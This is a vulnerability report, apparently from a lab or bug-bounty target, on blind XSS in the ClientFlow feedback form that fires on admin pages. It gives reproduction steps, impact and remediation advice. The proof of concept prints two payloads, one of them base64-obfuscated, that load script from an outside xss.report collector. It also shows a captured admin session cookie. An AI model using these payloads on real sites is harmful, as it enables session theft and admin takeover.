## Title
Blind XSS in Feedback Submission Form Fields - ClientFlow

## Description
**Affected URL:** https://clientflow.pwnedbox.site/feedback.php (triggers on https://clientflow.pwnedbox.site/admin/dashboard.php and https://clientflow.pwnedbox.site/admin/feedback.php?id=1)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the feedback submission form on `clientflow.pwnedbox.site`. Input submitted in the **Name** and **Your feedback** fields is stored without HTML encoding and renders directly in the DOM when an administrator views the admin dashboard (`/admin/dashboard.php`) or opens the individual submission (`/admin/feedback.php?id=1`). Because the script executes inside an authenticated admin session, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://clientflow.pwnedbox.site/feedback.php`, fill in the required fields with a Blind XSS payload in **Name** and **Your feedback**, and click **Send feedback**.
2. Log in to the admin panel (`https://clientflow.pwnedbox.site/admin/dashboard.php`) and view the feedback submissions list or click **View** on the submission (`/admin/feedback.php?id=1`).
3. Observe the payload execute immediately on both the dashboard and the submission detail page, sending out-of-band callbacks with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://clientflow.pwnedbox.site/feedback.php` (`Name` and `Your feedback` fields)

**Trigger Endpoint:** `https://clientflow.pwnedbox.site/admin/dashboard.php` (and `https://clientflow.pwnedbox.site/admin/feedback.php?id=1`)

**Payload:**
```html
"><script src=[https://xss.report/c/havemercy](https://xss.report/c/havemercy)></script>
```
*(Alternative payload submitted in Your feedback: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`)*

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://clientflow.pwnedbox.site/admin/dashboard.php`
- **Referrer:** `https://clientflow.pwnedbox.site/admin/login.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=090c5ef27580e77fc39cd97a92a4a7ca`

**Visual Evidence:**
- Feedback submission form on `clientflow.pwnedbox.site/feedback.php` with the Blind XSS payloads entered in **Name** and **Your feedback**.
  <img width="1525" height="987" alt="image" src="https://github.com/user-attachments/assets/ef69e2e4-a38d-4b83-abae-4a52f444426b" /><br><br>

- Admin dashboard (`/admin/dashboard.php`) rendering the injected payloads directly in the **SENDER** (`">`) and **MESSAGE** columns upon login.
  <img width="1542" height="717" alt="image" src="https://github.com/user-attachments/assets/9be2a14c-cac0-4096-b331-8bc6651f1d51" /><br><br>

- Individual submission view (`/admin/feedback.php?id=1`) displaying the rendered broken image icon inside the **Message** box and unencoded **SENDER** output.
  <img width="1542" height="617" alt="image" src="https://github.com/user-attachments/assets/2654709b-42a2-4cfb-afae-c18169417e75" /><br><br>

- Blind XSS collector report confirming execution on `/admin/dashboard.php` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1521" height="1070" alt="image" src="https://github.com/user-attachments/assets/281f48b7-0229-4b78-bebf-3d97f7f1edbc" /><br>


## Impact
Because the payload executes automatically as soon as an administrator opens the admin dashboard without needing to click into an individual submission:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, triage, or modify all captured feedback submissions and user account records.
- **Persistent Compromise:** Attackers can use the hijacked admin session to update submission statuses or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied feedback fields (`Name` and `Your feedback`) before rendering them in `/admin/dashboard.php` and `/admin/feedback.php`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
